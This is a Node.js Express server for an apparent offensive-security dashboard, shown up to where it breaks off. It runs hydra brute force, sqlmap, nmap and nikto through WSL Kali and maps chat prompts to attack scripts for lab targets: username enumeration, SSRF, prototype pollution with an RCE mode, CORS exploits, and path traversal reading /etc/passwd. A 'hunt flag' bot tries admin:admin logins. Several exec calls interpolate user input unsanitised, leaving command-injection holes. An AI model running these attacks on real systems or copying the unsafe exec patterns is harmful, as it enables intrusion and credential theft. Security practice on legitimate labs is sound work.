const { exec, spawn } = require("child_process");
const fs = require("fs");
const express = require("express");
const cors = require("cors");
const networkRoutes = require("./routes/network");
const systemRoutes = require("./routes/system");
const multer = require("multer");
const path = require("path");
const { randomUUID } = require("crypto");
const Jimp = require("jimp");
const dotenv = require("dotenv");

const app = express();
dotenv.config();
app.use(cors());
app.use(express.json());

app.use("/network", networkRoutes);
app.use("/system", systemRoutes);

// 📁 FILE UPLOAD & WORDLIST CONFIG
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
const USER_LIST_PATH = path.join(__dirname, "wordlists", "usernames.txt");
const PASS_LIST_PATH = path.join(__dirname, "wordlists", "passwords.txt");

const wordlistDir = path.join(__dirname, "wordlists");
if (!fs.existsSync(wordlistDir)) {
    fs.mkdirSync(wordlistDir, { recursive: true });
    console.log("✅ Created wordlists folder at:", wordlistDir);
}

[USER_LIST_PATH, PASS_LIST_PATH].forEach(file => {
    if (!fs.existsSync(file)) {
        fs.writeFileSync(file, ""); 
        console.log("✅ Created empty file:", file);
    }
});

// ================================
// ⚙️ HELPERS & WORDLIST LOGIC
// ================================

function updateWordlist(filePath, newValue) {
    if (!newValue) return;
    if (!fs.existsSync(filePath)) fs.writeFileSync(filePath, "");
    
    const content = fs.readFileSync(filePath, "utf-8");
    const items = content.split(/\r?\n/).map(i => i.trim()).filter(i => i !== "");
    
    if (!items.includes(newValue.trim())) {
        fs.appendFileSync(filePath, `${newValue.trim()}\n`);
        console.log(`Added to list: ${newValue}`);
    }
}

function sanitizeUrl(url) {
    return url.replace(/[^a-zA-Z0-9.\-:/]/g, "");
}
function windowsToWslPath(winPath) {
    // 1. Replace C: with /mnt/c
    let wslPath = winPath.replace(/^([a-zA-Z]):/, (match, drive) => `/mnt/${drive.toLowerCase()}`);
    // 2. Flip backslashes \ to forward slashes /
    wslPath = wslPath.replace(/\\/g, '/');
    return wslPath;
}
const os = require("os");

const GO_BIN = `${os.homedir()}/go/bin`;

process.env.PATH += `:${GO_BIN}`;

const SUBFINDER = `${GO_BIN}/subfinder`;
const ASSETFINDER = `${GO_BIN}/assetfinder`;

const activeScans = new Map();

app.get("/subdomains-stream", (req, res) => {
    const domain = req.query.domain;

    if (!domain || !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
        return res.status(400).end("Invalid domain");
    }

    const scanId = randomUUID();

    res.writeHead(200, {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive"
    });

    // send scan ID to frontend
    res.write(`event: scanId\ndata: ${scanId}\n\n`);

    const tools = [
        { name: SUBFINDER, args: ["-d", domain, "-silent"] },
        { name: ASSETFINDER, args: ["--subs-only", domain] }
    ];

    const seen = new Set();
    const processes = [];
    let finished = 0;

    tools.forEach(tool => {
        const proc = spawn(tool.name, tool.args);
        processes.push(proc);

        proc.stdout.on("data", (data) => {
            const lines = data.toString().split("\n").filter(Boolean);

            lines.forEach(line => {
                if (!seen.has(line)) {
                    seen.add(line);
                    res.write(`data: ${line}\n\n`);
                }
            });
        });

        proc.stderr.on("data", (data) => {
            res.write(`event: error\ndata: [${tool.name}] ${data.toString()}\n\n`);
        });

        proc.on("error", (err) => {
            res.write(`event: error\ndata: spawn failed: ${err.message}\n\n`);
        });

        proc.on("close", () => {
            finished++;

            if (finished === tools.length) {
                res.write(`event: done\ndata: complete\n\n`);
                res.end();
                activeScans.delete(scanId);
            }
        });
    });

    activeScans.set(scanId, processes);

    req.on("close", () => {
        processes.forEach(p => p.kill());
        activeScans.delete(scanId);
    });
});

app.post("/stop-scan", (req, res) => {
    const { scanId } = req.body;

    if (activeScans.has(scanId)) {
        activeScans.get(scanId).forEach(p => p.kill());
        activeScans.delete(scanId);
        return res.json({ stopped: true });
    }

    res.json({ stopped: false });
});
// 🔴 STOP endpoint
app.post("/stop-scan", (req, res) => {
    const { scanId } = req.body;

    if (activeScans.has(scanId)) {
        activeScans.get(scanId).forEach(p => p.kill());
        activeScans.delete(scanId);
        return res.json({ stopped: true });
    }

    res.json({ stopped: false });
});

function runCommand(cmd) {
    return new Promise((resolve, reject) => {
        exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
            if (err) return reject(err.message);
            resolve(stdout);
        });
    });
}
function parseNetstatWindows(output) {
    const lines = output.split("\n");
    const results = [];

    for (const line of lines) {
        const parts = line.trim().split(/\s+/);

        if (parts.length < 4) continue;
        if (!parts[1] || !parts[2]) continue;

        results.push({
            protocol: parts[0],
            localAddress: parts[1],
            foreignAddress: parts[2],
            state: parts[3] || "UNKNOWN",
            pid: parts[4] || null
        });
    }

    return results;
}
function parseLinuxSS(output) {
    const lines = output.split("\n");
    const results = [];

    for (const line of lines) {
        if (!line.includes("LISTEN") && !line.includes("ESTAB")) continue;

        results.push({
            raw: line.trim()
        });
    }

    return results;
}
async function scanPorts() {
    const platform = os.platform();

    let cmd;
    let parser;

    if (platform === "win32") {
        cmd = "netstat -ano";
        parser = parseNetstatWindows;
    } 
    else if (platform === "linux") {
        cmd = "ss -tulpen";
        parser = parseLinuxSS;
    } 
    else {
        cmd = "lsof -i -n -P";
        parser = (out) => out.split("\n").map(l => ({ raw: l }));
    }

    const output = await runCommand(cmd);

    return {
        platform,
        timestamp: new Date().toISOString(),
        count: parser(output).length,
        processes: parser(output)
    };
}
app.get("/scan/ports", async (req, res) => {
    try {
        const data = await scanPorts();
        res.json(data);
    } catch (err) {
        res.status(500).json({
            error: "Port scan failed",
            details: err.toString()
        });
    }
});
// --- CREATE: Hide message in image ---
const sharp = require('sharp');

app.post('/stego-create', upload.single('image'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).send("No file.");

        // 1. Force the image to 4 channels (RGBA) so the math is predictable
        const pipeline = sharp(req.file.buffer).ensureAlpha();
        const { data, info } = await pipeline.raw().toBuffer({ resolveWithObject: true });

        const message = req.body.message + "###";
        let binaryMsg = "";
        for (let i = 0; i < message.length; i++) {
            binaryMsg += message[i].charCodeAt(0).toString(2).padStart(8, '0');
        }

        // 2. Capacity Check: 3 bits per pixel (we skip the 4th/Alpha channel)
        if (binaryMsg.length > (info.width * info.height * 3)) {
            return res.status(400).send("Message too large for this image.");
        }

        let bitIndex = 0;
        // 3. Modification Loop
        for (let i = 0; i < data.length; i++) {
            // Check if this is an Alpha byte (every 4th byte: 3, 7, 11...)
            if ((i + 1) % 4 === 0) continue; 

            if (bitIndex < binaryMsg.length) {
                data[i] = (data[i] & 0xFE) | parseInt(binaryMsg[bitIndex]);
                bitIndex++;
            } else break;
        }

        // 4. Re-encode using the EXACT same dimensions and 4 channels
        const outputBuffer = await sharp(data, {
            raw: {
                width: info.width,
                height: info.height,
                channels: 4 // Must match info.channels from the raw pull
            }
        }).png().toBuffer();

        res.set('Content-Type', 'image/png');
        res.send(outputBuffer);

    } catch (err) {
        console.error("STEGO_FAIL:", err);
        res.status(500).send("Processing Error: " + err.message);
    }
});
// --- EXTRACT: Reveal message from image ---
app.post('/stego-extract', upload.single('image'), async (req, res) => {
    try {
        if (!req.file || !req.file.buffer) return res.status(400).send("No file.");
        
        const image = await Jimp.read(req.file.buffer);
        const data = image.bitmap.data;
        let binaryMsg = "";
        
        for (let i = 0; i < data.length; i++) {
            // Skip Alpha channel just like we did in 'create'
            if ((i + 1) % 4 === 0) continue; 
            
            // Grab the last bit
            binaryMsg += (data[i] & 1).toString();
        }

        let message = "";
        for (let i = 0; i < binaryMsg.length; i += 8) {
            let byte = binaryMsg.substr(i, 8);
            let charCode = parseInt(byte, 2);
            message += String.fromCharCode(charCode);
            
            if (message.endsWith("###")) break; 
        }

        res.json({ message: message.replace("###", "") });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Extraction failed: " + err.message });
    }
});
// ================================
// 🔍 SCAN ROUTE
// ================================
app.post("/scan", (req, res) => {
    const { type, target, service } = req.body; 
    let command = "";

    if (type === 'WEB') {
        const cleanTarget = target.replace(/^https?:\/\//, '').replace(/\/$/, '');
        command = `wsl -d kali-linux -- bash -c "nikto -h ${cleanTarget} -port 80,443 -Tuning 123b"`;
        console.log(`📡 Initializing WEB scan on: ${cleanTarget}`);
    } else if (type === 'CODE') {
        const wslPath = windowsToWslPath(target);
        command = `wsl -d kali-linux -- bash -c "grep -riE --exclude-dir=node_modules 'password|api_key|eval\\(|exec\\(' '${wslPath}'"`;
    } else if (type === 'NMAP') {
        const cleanTarget = target.replace(/^https?:\/\//, '').replace(/\/$/, '');
        const finalTarget = sanitizeUrl(cleanTarget);
        command = `wsl -d kali-linux -- bash -c "nmap -sV -F ${finalTarget}"`;
        console.log(`🌐 Mapping Network: ${finalTarget}`);
    } else if (type === 'SQL') {
        // SQLmap needs the full URL including query parameters
        const finalTarget = sanitizeUrl(target); 
        // --batch: automates prompts, --banner: retrieves DB version info
        command = `wsl -d kali-linux -- bash -c "sqlmap -u '${finalTarget}' --batch --banner --random-agent"`;
        console.log(`🗄️ Testing Database Injection: ${finalTarget}`);
    } else if (type === 'BRUTE') {
        const wslUserList = windowsToWslPath(USER_LIST_PATH);
        const wslPassList = windowsToWslPath(PASS_LIST_PATH);
        const cleanTarget = sanitizeUrl(target);
        const targetService = service || "ssh"; 

        command = `wsl -d kali-linux -- bash -c "hydra -L '${wslUserList}' -P '${wslPassList}' -t 4 ${cleanTarget} ${targetService}"`;
        console.log(`🔥 Launching Brute Force on ${cleanTarget} via ${targetService}`);
    }

    exec(command, { timeout: 90000 }, (err, stdout, stderr) => {
        if (err && !stdout) {
            return res.status(500).json({ findings: "Protocol failed. Check target or wordlists." });
        }
        res.json({ findings: stdout || "Operation complete. No credentials recovered." });
    });
});
const crypto = require("crypto");

app.post("/encrypt-file", upload.single("file"), (req, res) => {
    try {
        const password = req.body.password;
        const file = req.file;

        if (!password || !file) {
            return res.status(400).send("Missing file or password");
        }

        const salt = crypto.randomBytes(16);
        const key = crypto.pbkdf2Sync(password, salt, 100000, 32, "sha256");

        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);

        const encrypted = Buffer.concat([
            cipher.update(file.buffer),
            cipher.final()
        ]);

        const tag = cipher.getAuthTag();

        const output = Buffer.concat([salt, iv, tag, encrypted]);

        res.send(output);

    } catch (err) {
        res.status(500).send("Encryption failed");
    }
});
app.post("/decrypt-file", upload.single("file"), (req, res) => {
    try {
        const password = req.body.password;
        const data = req.file.buffer;

        const salt = data.slice(0, 16);
        const iv = data.slice(16, 28);
        const tag = data.slice(28, 44);
        const ciphertext = data.slice(44);

        const key = crypto.pbkdf2Sync(password, salt, 100000, 32, "sha256");

        const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
        decipher.setAuthTag(tag);

        const decrypted = Buffer.concat([
            decipher.update(ciphertext),
            decipher.final()
        ]);

        res.send(decrypted);

    } catch (err) {
        res.status(400).send("Invalid password or corrupted file");
    }
});
app.post("/run-code", async (req, res) => {
    const { code, lang } = req.body;

    if (!code || !lang) {
        return res.status(400).json({ output: "Error: Missing code or language." });
    }

    const id = Date.now();
    const dir = path.join(__dirname, "sandbox", id.toString());

    fs.mkdirSync(dir, { recursive: true });

    // Fix Windows path issues for Docker
    const dockerPath = dir.replace(/\\/g, "/");

    let filename, command;

    if (lang === "python") {
        filename = "main.py";
        fs.writeFileSync(path.join(dir, filename), code);

        command = `docker run --rm \
--memory=128m \
--cpus=0.5 \
--network=none \
--pids-limit=64 \
--read-only \
-v "${dockerPath}:/app" \
-w /app \
python:3.11 \
sh -c "timeout 5 python main.py"`;
    }

    else if (lang === "c") {
        filename = "main.c";
        fs.writeFileSync(path.join(dir, filename), code);

        command = `docker run --rm \
--memory=128m \
--cpus=0.5 \
--network=none \
--pids-limit=64 \
--read-only \
-v "${dockerPath}:/app" \
-w /app \
gcc:latest \
sh -c "gcc main.c -o main && timeout 5 ./main"`;
    }

    else if (lang === "javascript") {
        filename = "main.js";
        fs.writeFileSync(path.join(dir, filename), code);

        command = `docker run --rm \
--memory=128m \
--cpus=0.5 \
--network=none \
--pids-limit=64 \
--read-only \
-v "${dockerPath}:/app" \
-w /app \
node:20 \
sh -c "timeout 5 node main.js"`;
    }

    else {
        return res.status(400).json({ output: "Unsupported language." });
    }

    exec(command, { timeout: 7000 }, (err, stdout, stderr) => {
        let output = "";

        if (stdout) output += stdout;
        if (stderr) output += stderr;

        if (err) {
            // Ignore timeout exit code noise if already handled
            if (!output.includes("timed out")) {
                output += "\nERROR:\n" + err.message;
            }
        }

        if (!output.trim()) {
            output = "No output (program ran successfully)";
        }

        res.json({ output });

        // Cleanup safely
        try {
            fs.rmSync(dir, { recursive: true, force: true });
        } catch (cleanupErr) {
            console.error("Cleanup error:", cleanupErr);
        }
    });
});
// ================================
// 🧠 MAIN AI ROUTE
// ================================
app.post("/ask", async (req, res) => {
    let { prompt, haqEnabled, labUrl, newUser, newPass } = req.body;

    try {
        const lowerPrompt = (prompt || "").toLowerCase();
        
        if (lowerPrompt.includes("username enumeration") && lowerPrompt.includes("different responses")) {
            
            // Updated RegEx to capture multiple items separated by commas or spaces
            // It stops when it hits another keyword (labURL, newpass, etc.)
            const urlMatch  = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const userMatch = prompt.match(/newusers?[:\s]+([^newpass|labURL\n]+)/i);
            const passMatch = prompt.match(/newpass(?:es)?[:\s]+([^newuser|labURL\n]+)/i);
            
            const finalUrl = urlMatch ? urlMatch[1] : (labUrl || "0a6500cd0381393882a7561b004c00ee.web-security-academy.net");
            
            // Handle Multiple Users
            if (userMatch) {
                const userString = userMatch[1].trim();
                const userList = userString.split(/[\s,]+/).filter(u => u.length > 0);
                userList.forEach(u => updateWordlist(USER_LIST_PATH, u));
            } else if (newUser) {
                updateWordlist(USER_LIST_PATH, newUser);
            }
            
            // Handle Multiple Passwords
            if (passMatch) {
                const passString = passMatch[1].trim();
                const passList = passString.split(/[\s,]+/).filter(p => p.length > 0);
                passList.forEach(p => updateWordlist(PASS_LIST_PATH, p));
            } else if (newPass) {
                updateWordlist(PASS_LIST_PATH, newPass);
            }
            
            const target = sanitizeUrl(finalUrl);
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/enumerate.sh ${target}"`;
            console.log(`🚀 Executing: ${wslCmd}`);
            
            exec(wslCmd, { shell: true }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                const errorLog = (stderr || "").trim();
                
                if (err && !output) {
                    return res.json({
                        reply: "❌ WSL Execution Error",
                        details: errorLog || `Exit Code: ${err.code}` 
                    });
                }
                
                return res.json({
                    reply: output ? `🎯 Automation Result for ${target}:\n${output}` : "⚠️ Script finished with no output.",
                    status: err ? "Script completed with logical errors." : "Scan complete."
                });
            });
            return
        }

        if (lowerPrompt.includes("password reset poisoning")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const exploitUrlMatch = prompt.match(/exploitURL[:\s]+([^\s]+)/i);
            const targetUserMatch = prompt.match(/for (?:a )?user\s+([^\s?]+)/i);

            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalExploitUrl = exploitUrlMatch ? exploitUrlMatch[1] : "";
            const finalUser = targetUserMatch ? targetUserMatch[1] : "";

            const target = sanitizeUrl(finalLabUrl);
            const exploit = sanitizeUrl(finalExploitUrl);

            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/enumerate.sh ${target} ${exploit} ${finalUser}"`;

            exec(wslCmd, { shell: true }, (err, stdout, stderr) => {
                return res.json({ reply: stdout || "Done" });
            });
            return;
        }

        if (lowerPrompt.includes("ssrf") && lowerPrompt.includes("analyze")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const internalMatch = prompt.match(/internalTarget[:\s]+([^\s]+)/i);
            // NEW: Capture the Mode or Scenario (e.g., analyze, verify, or rank)
            const modeMatch = prompt.match(/mode[:\s]+([^\s]+)/i) || ["", "analyze"];
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalInternal = internalMatch ? internalMatch[1] : "127.0.0.1";
            const mode = modeMatch[1];
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL for statistical analysis." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            // UPDATED: Point to the new inference script
            // We pass the target, internal IP, and iterations for statistical significance
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/ssrf_inference.sh ${target} ${finalInternal} 10"`;
            
            console.log(`📡 Initiating SSRF Inference Engine [${mode.toUpperCase()}]: ${target} -> ${finalInternal}`);
            
            exec(wslCmd, { shell: true, timeout: 120000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({ reply: "❌ Inference Engine Failure", details: stderr || `Exit Code: ${err.code}` });
                }
                
                // The reply now contains the Ranked Anomaly Report we built
                return res.json({
                    reply: output ? `🔬 SSRF Behavioral Analysis for ${target}:\n${output}` : "⚠️ Engine returned no statistical anomalies.",
                    status: "Inference sequence finished."
                });
            });
            return;
        }
        if (lowerPrompt.includes("dom xss") || lowerPrompt.includes("prototype pollution")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Please provide a labURL to scan for Prototype Pollution gadgets." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            // This triggers our custom automation script in Kali
            // We pass the target URL to a script dedicated to finding pollution sinks
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/pp_scan.sh ${target}"`;
            
            console.log(`🧪 Testing Prototype Pollution Sinks: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 120000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({
                        reply: "❌ Scan Engine Failure",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                return res.json({
                    reply: output ? `🛡️ DOM XSS / Prototype Pollution Report for ${target}:\n${output}` : "⚠️ No obvious prototype gadgets detected.",
                    status: "Pollution analysis finished."
                });
            });
            return;
        }
        if (lowerPrompt.includes("server-side pollution") || lowerPrompt.includes("sspp")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Provide a labURL to test for Server-Side Prototype Pollution." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            // Identify if the user wants to go for RCE (Expert) or just PrivEsc (Practitioner)
            const mode = lowerPrompt.includes("rce") || lowerPrompt.includes("expert") ? "rce" : "detect";
            
            // This calls a dedicated python or bash script for SSPP testing
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/sspp_test.sh ${target} ${mode}"`;
            
            console.log(`🧪 Testing Server-Side Pollution [MODE: ${mode}]: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 180000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({
                        reply: "❌ SSPP Engine Failure",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                return res.json({
                    reply: output ? `💀 Server-Side Prototype Pollution Report for ${target}:\n${output}` : "⚠️ No server-side pollution vulnerabilities detected.",
                    status: "SSPP analysis finished."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("hunt flag")) {
            const targetMatch = prompt.match(/at\s+([^\s]+)/i);
            const target = sanitizeUrl(targetMatch ? targetMatch[1] : (labUrl || ""));
            
            if (!target) return res.json({ reply: "⚠️ I need a target IP/URL to hunt!" });
            
            console.log(`🤖 BOT ACTIVATED: Hunting for flags on ${target}...`);
            
            const botCmd = `wsl -d kali-linux -- bash -c "
                UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
                
                echo '[+] Discovering PHP Endpoints...';
                ENDPOINTS=\\$(curl -A \\\"\\$UA\\\" -s http://${target} | grep -oE '/[a-zA-Z0-9._-]+\\.php' | sort -u);
                
                echo '[+] Attempting Login (admin:admin)...';
                # We use -i to grab headers and grep for the Set-Cookie line
                COOKIE_DATA=\\$(curl -A \\\"\\$UA\\\" -s -i -X POST -d 'username=admin&password=admin' 'http://${target}/index.php');
                COOKIE=\\$(echo \\\"\\$COOKIE_DATA\\\" | grep -i 'Set-Cookie' | cut -d ' ' -f 2 | cut -d ';' -f 1);
                
                if [ -z \\\"\\$COOKIE\\\" ]; then
                    echo '[-] Auth Failed or no cookie returned.';
                else
                    echo '[+] Authenticated! Cookie: \\$COOKIE';
                    echo '[+] Scanning discovered endpoints for flag...';
                    
                    # Loop through all found .php files and try the JSON search payload
                    for ep in \\$ENDPOINTS; do
                        echo -n \\\"Checking \\$ep... \\\";
                        RESULT=\\$(curl -A \\\"\\$UA\\\" -s -X POST -H 'Content-Type: application/json' -b \\\"\\$COOKIE\\\" -d '{\\\"search\\\":\\\"flag\\\"}' \\\"http://${target}\\$ep\\\");
                        
                        if echo \\\"\\$RESULT\\\" | grep -q 'HTB{'; then
                            echo 'FOUND!';
                            echo \\\"\\$RESULT\\\" | grep -oE 'HTB\\{[^\\}]+\\}';
                        else
                            echo 'No flag.';
                        fi
                    done
                fi
            "`;
            
            exec(botCmd, { shell: true }, (err, stdout, stderr) => {
                if (err && !stdout) return res.json({ reply: "❌ Bot Error", details: stderr });
                return res.json({
                    reply: stdout ? `🎯 Operation Results:\n${stdout}` : "⚠️ Bot finished. No flag found.",
                    status: "Search complete."
                });
            });
            return;
        }
        
        if(lowerPrompt.includes("graphql") && (lowerPrompt.includes("private") || lowerPrompt.includes("introspection") || lowerPrompt.includes("idor") || lowerPrompt.includes("token")  || lowerPrompt.includes("leak"))) {
            // 1. Extract Target URL from prompt or context
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Provide a labURL to scan for GraphQL issues." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            // 2. Extract Token if provided
            const tokenMatch = prompt.match(/token[:\s]+([^\s]+)/i);
            const token = tokenMatch ? tokenMatch[1] : "";
            
            const safeTarget = target.replace(/"/g, '\\"');
            const safeToken = token.replace(/"/g, '\\"');
            
            // 3. Construct WSL Command
            const wslCmd = `wsl -d kali-linux -- bash -c "python3 /home/HAQCORE/scripts/graphql_scan_prod.py \\"${safeTarget}\\" \\"${safeToken}\\""`;
            
            console.log(`📡 Running GraphQL scanner: ${target}`);
            
            // 4. Execute inside WSL
            exec(wslCmd, { shell: true, timeout: 180000, maxBuffer: 1024 * 1024 * 10 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (err && !output) {
                    return res.json({
                        reply: "❌ GraphQL Engine Failure",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                // 5. Intelligent Summary Logic
                let summary = "⚠️ No major issues detected.";
                let finalReply = output;
                
                // Try to prettify the JSON for the chat UI
                try {
                    const parsed = JSON.parse(output);
                    finalReply = "```json\n" + JSON.stringify(parsed, null, 2) + "\n```";
                } catch (e) {
                    finalReply = output; // Fallback if Python output wasn't clean JSON
                }
                
                if (output.includes("IDOR") || output.includes("auth_diff") || output.toLowerCase().includes("sensitive")) {
                    summary = "🚨 Potential GraphQL vulnerabilities detected!";
                }
                
                // 6. Return response to Dashboard
                return res.json({
                    reply: `🔍 **GraphQL Analysis Report for ${target}:**\n${finalReply}`,
                    summary,
                    status: "GraphQL analysis finished."
                });
            });
            
            return;
        }
        
        if (lowerPrompt.includes("cors") && (lowerPrompt.includes("basic") || lowerPrompt.includes("reflection"))) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL. Use: 'scan basic cors for labURL: [url]'" });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/cors_scan.sh ${target}"`;
            
            console.log(`📡 Testing Basic CORS Reflection: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 60000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (err && !output) {
                    return res.json({
                        reply: "❌ CORS Reflection Test Failed",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                return res.json({
                    reply: output ? `🔬 **CORS Reflection Report for ${target}:**\n\n${output}` : "⚠️ Target does not reflect the Origin header.",
                    status: "Basic Reflection Analysis Complete"
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("cors") && lowerPrompt.includes("null")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const exploitUrlMatch = prompt.match(/exploitURL[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            // Default to a placeholder if exploitURL isn't provided in the prompt
            const finalExploitUrl = exploitUrlMatch ? exploitUrlMatch[1] : "YOUR-EXPLOIT-SERVER";
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL. Example: 'scan null cors labURL: [url] exploitURL: [url]'" });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            const exploit = sanitizeUrl(finalExploitUrl);
            
            // Pass TWO arguments now: target and exploit server
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/cors_null_scan.sh ${target} ${exploit}"`;
            
            console.log(`📡 Testing Null Origin: ${target} -> Logging to: ${exploit}`);
            
            exec(wslCmd, { shell: true, timeout: 60000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({ reply: "❌ CORS Null Test Failed", details: stderr });
                }
                
                return res.json({
                    reply: output ? `🔬 **CORS Null Origin Report for ${target}:**\n\n${output}` : "⚠️ Not vulnerable.",
                    status: "Null Origin Analysis Complete"
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("cors") && (lowerPrompt.includes("fuzz") || lowerPrompt.includes("regex"))) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const exploitUrlMatch = prompt.match(/exploitURL[:\s]+([^\s]+)/i);
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const finalExploitUrl = exploitUrlMatch ? exploitUrlMatch[1] : "YOUR-EXPLOIT-SERVER";
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL. Use: 'fuzz cors for labURL: [url]'" });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            const exploit = sanitizeUrl(finalExploitUrl);
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/cors_regex_fuzzer.sh ${target} ${exploit}"`;
            
            console.log(`📡 Launching CORS Regex Fuzzer: ${target}`);
            
            exec(wslCmd, { shell: true, timeout: 90000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                if (err && !output) {
                    return res.json({ reply: "❌ Fuzzer Failure", details: stderr });
                }
                
                return res.json({
                    reply: output ? `🔬 **CORS Regex Fuzzing Report:**\n\n${output}` : "⚠️ No bypasses found.",
                    status: "Fuzzing sequence finished."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("path traversal") || lowerPrompt.includes("nested traversal")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const paramMatch = prompt.match(/parameter[:\s]+([^\s]+)/i) || ["", "filename"];
            const fileMatch = prompt.match(/file[:\s]+([^\s]+)/i) || ["", "/etc/passwd"];
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const param = paramMatch[1];
            const targetFile = fileMatch[1];
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL. Use: 'scan path traversal for labURL: [url]'" });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/traversal_scan.sh ${target} ${param} ${targetFile}"`;
            
            console.log(`📂 Testing Nested Path Traversal: ${target} (Param: ${param})`);
            
            exec(wslCmd, { shell: true, timeout: 60000 }, (err, stdout, stderr) => {
                const output = (stdout || "").trim();
                
                if (err && !output.includes("MATCH_FOUND")) {
                    return res.json({
                        reply: "❌ Traversal Attack Failed",
                        details: stderr || `Exit Code: ${err.code}`
                    });
                }
                
                if (output.includes("MATCH_FOUND")) {
                    // Extract the actual file content from the script output
                    const fileContent = output.split("----------------------------------------")[1];
                    return res.json({
                        reply: `🎯 **Traversal Successful!** Content of ${targetFile}:\n\n\`\`\`\n${fileContent}\n\`\`\``,
                        status: "Exploit complete."
                    });
                }
                
                return res.json({
                    reply: "⚠️ The nested filter bypass didn't return the expected file. The server might be using recursive stripping or a different filter.",
                    status: "Scan finished."
                });
            });
            return;
        }
        
        if (lowerPrompt.includes("absolute path") || lowerPrompt.includes("bypass absolute")) {
            const labUrlMatch = prompt.match(/labURL[:\s]+([^\s]+)/i);
            const paramMatch = prompt.match(/parameter[:\s]+([^\s]+)/i) || ["", "filename"];
            
            const finalLabUrl = labUrlMatch ? labUrlMatch[1] : (labUrl || "");
            const param = paramMatch[1];
            
            if (!finalLabUrl) {
                return res.json({ reply: "⚠️ Missing labURL for Absolute Path test." });
            }
            
            const target = sanitizeUrl(finalLabUrl);
            const wslCmd = `wsl -d kali-linux -- bash -c "bash /home/HAQCORE/scripts/traversal_absolute.sh ${target} ${param}"`;
            
